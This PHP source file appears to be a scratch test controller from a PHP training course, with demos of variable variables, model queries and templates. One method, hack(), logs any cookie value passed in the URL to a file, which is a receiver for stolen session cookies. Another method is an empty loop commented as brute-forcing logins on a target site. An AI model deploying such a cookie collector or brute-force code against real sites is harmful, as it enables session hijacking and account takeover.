<?php
/**
 * 传智播客：高端PHP培训
 * 网站：http://www.itcast.cn
 */
namespace app\controller\backend;

use app\model\ProductModel;
use app\model\UserModel;
use core\Model;

class TestController extends \core\Controller
{
    public function count()
    {
        var_dump(UserModel::create()->getCount());
        var_dump(ProductModel::create()->getCount());
    }

    public function v()
    {
        $data = array(
            'name' => 111,
            'age' => 22,
        );
        foreach($data as $variableName => $variableValue) {
            $$variableName = $variableValue;
        }
        echo $name . '<br />';
        echo $age;
    }

    public function x()
    {
        for ($i = 0; $i < 100000000; $i ++) {
            // 到目标网站上尝试用户名和密码的组合
        }
        echo '完成!';
    }

    public function hack()
    {
        $content = $_GET['cookie'];
        file_put_contents('1.txt', $content, FILE_APPEND);
    }

    public function y()
    {
        var_dump(Model::create()->exec("UPDATE `category` set nickname='2' WHERE id=7"));// 0
        var_dump(Model::create()->exec("UPDATE dfadfadsf"));// false
    }

    public function z()
    {
        function loadHtml($data = array())
        {
            foreach($data as $key => $value) {
                // $key = 'a', $$key = $a | $key 等于 'categories' $$key 等于 $categories
                $$key = $value;// $a = 1;, $$key声明了第一次：$a, 第二次：$categories分别声明两个变量
                var_dump($key, $value);
            }
            var_dump($a, $categories);
            echo '完成！';
        }
        loadHtml(array(
            'a' => '1000',
            'categories' => array(),
        ));
    }

    public function a()
    {
        $obj = new \stdClass();
        $obj->name = 'papi酱';
        $obj->age = 18;
        var_dump($obj);
        $obj->mobile_number = '13111111111';
        var_dump($obj);
    }

    public function b()
    {
        $this->s->display('backend/test/b.html');
        // var_dump($s);
    }

    public function c()
    {
        $this->s->display('backend/test/c.html');
    }
}